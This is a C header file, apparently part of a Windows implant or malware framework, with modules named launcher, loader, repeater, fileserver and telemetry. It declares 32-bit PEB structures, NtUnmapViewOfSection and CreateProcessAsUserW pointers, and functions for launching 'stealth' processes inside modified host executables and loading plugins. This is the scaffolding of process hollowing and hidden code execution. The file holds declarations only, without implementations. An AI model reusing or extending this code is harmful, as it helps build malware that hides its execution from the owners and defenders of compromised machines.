#ifndef _STEALTH_H_
#define _STEALTH_H_

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <shlwapi.h>
#include <stdlib.h>
#include <strsafe.h>
#include "config.h"

#ifdef LAUNCHER_MODULE
    #define __MODULE__ "LAUNCHER"
#elif LOADER_MODULE
    #define __MODULE__ "LOADER"
#elif UNIT_TEST_MODULE
    #define __MODULE__ "UNIT_TEST"
#elif REPEATER_MODULE
    #define __MODULE__ "REPEATER"
#elif FILESERVER_MODULE
    #define __MODULE__ "FILESERVER"
#elif TELEMETRY_MODULE
    #define __MODULE__ "TELEMETRY"
#endif

typedef struct _UNICODE_STRING_32
{
    USHORT Length;
    USHORT MaximumLength;
    DWORD Buffer;
} UNICODE_STRING_32, *PUNICODE_STRING_32;

typedef struct _RTL_USER_PROCESS_PARAMETERS_32
{
    BYTE Reserved1[16];
    DWORD Reserved2[10];
    UNICODE_STRING_32 ImagePathName;
    UNICODE_STRING_32 CommandLine;
} RTL_USER_PROCESS_PARAMETERS_32, *PRTL_USER_PROCESS_PARAMETERS_32;

typedef struct _LIST_ENTRY_32
{
    DWORD Flink;
    DWORD Blink;
} LIST_ENTRY_32, *PLIST_ENTRY_32;

typedef struct _PEB_LDR_DATA_32
{
    BYTE Reserved1[8];
    DWORD Reserved2[3];
    LIST_ENTRY_32 InMemoryOrderModuleList;
} PEB_LDR_DATA_32, *PPEB_LDR_DATA_32;

typedef struct _PEB_32
{
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    DWORD Reserved3[2];
    DWORD Ldr;
    DWORD ProcessParameters;
    DWORD Reserved4[3];
    DWORD AtlThunkSListPtr;
    DWORD Reserved5;
    ULONG Reserved6;
    DWORD Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    DWORD Reserved9[45];
    BYTE Reserved10[96];
    DWORD PostProcessInitRoutine;
    BYTE Reserved11[128];
    DWORD Reserved12[1];
    ULONG SessionId;
} PEB_32, *PPEB_32;

typedef FARPROC (WINAPI *func_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef LONG (WINAPI * func_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef BOOL (WINAPI * func_CreateProcessAsUserW)(HANDLE, PWCHAR, PWCHAR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, PWCHAR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

extern DWORD dwID;

PWCHAR GetProcessCommandLine(DWORD dwPID, BOOL bWOW64);
DWORD GetStealthProcessPID(PWCHAR pwszHostProcess, PWCHAR pwszArgument, BOOL bWOW64);
BOOL CopyAndModifyHost(LPVOID lpModule, PWCHAR pwszInputFile, PWCHAR pwszOutputFile, BOOL bWOW64);
BOOL RunProcess(PWCHAR pwszHostPath, PWCHAR pwszArgument, DWORD dwCreationFlags, HANDLE hStdIn, HANDLE hStdOut, LPHANDLE lphProcess, LPHANDLE lphThread, BOOL bImpersonate);
DWORD LaunchStealthProcess(PWCHAR pwszHostPath, PWCHAR pwszArgument, HANDLE hStdIn, HANDLE hStdOut, LPVOID lpFile, DWORD dwFile, BOOL bImpersonate);
BOOL LaunchPlugin(PWCHAR pwszPluginName, LPVOID lpFile, DWORD dwFile);

#endif /* !_STEALTH_H_ */